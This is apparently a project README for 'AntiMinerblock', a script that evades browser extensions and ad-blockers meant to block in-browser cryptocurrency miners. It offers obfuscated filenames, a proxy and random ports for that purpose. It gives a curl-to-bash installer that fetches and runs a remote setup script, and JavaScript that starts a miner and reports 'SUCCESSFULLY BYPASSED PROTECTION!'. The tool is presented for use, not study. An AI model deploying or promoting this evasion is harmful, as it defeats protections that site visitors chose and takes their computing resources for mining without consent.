# AntiMinerblock
This script attempts to bypass extensions or network blocks that prevent the use of online cryptocurrency miners.

## 100% effectiveness from tested extensions
* MinerBlock
* AntiMiner
* Adblock (all lists enabled)
* Adblock Plus
### Test it at: https://skyrisbactera.com/antiminerblock/test.html

## Features
* 100% success rate
* Obfuscates filenames per server
* Automatically creates proxy (using coin-hive-stratum)
* Random port
* Interactive setup

## Installation
### Ubuntu/Unix
First, make sure you have Node.js installed:
https://nodejs.org/en/download/package-manager/

Navigate to your server's scripts directory and run
```bash
bash <(curl -s https://raw.githubusercontent.com/SkyrisBactera/AntiMinerblock/master/setup.sh)
```
Then, add the script tag that the file generates to every HTML file you want to be protected. That's it!
### Windows
Not implemented yet (you can use cygwin for now)

## Usage
Call loadCryptominer, which will return a miner, and will return a value 0 to 4 referring to whether or not it worked.
```
0 - Remote coinhive
1 - Local coinhive with proxy
2 - Authedmine
3 - Crypto-loot
4 - Cloudcoins
5 - All blocked
6 - Script not blocked, but failure creating miner instance
```

Example:
```javascript
loadCryptominer(function(miner, status) {
  //Code that mines
  //For example:
  if (status == 5 || status == 6) {
    console.log("TEST FAILED!")
  } else {
    console.log("SUCCESSFULLY BYPASSED PROTECTION!")
  }
  miner.start();
  // Update stats once per second
  setInterval(function() {
    var hashesPerSecond = miner.getHashesPerSecond();
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes();
    console.log(hashesPerSecond, totalHashes, acceptedHashes)
    }, 1000);
});
```
## Donate!
If you appreciate this project, feel free to send me some Monero at:
```424kUkn7pU7SVF4qmbzVt6fLPRFw6Q1v7RmVq4qE9sE2V5dyhZoGdWHDUFui85SfhVTfmDN3CzcYDQSwo41z3AuLDzU3qQt```

or just use PayPal:
```davis@skyrisbactera.com```
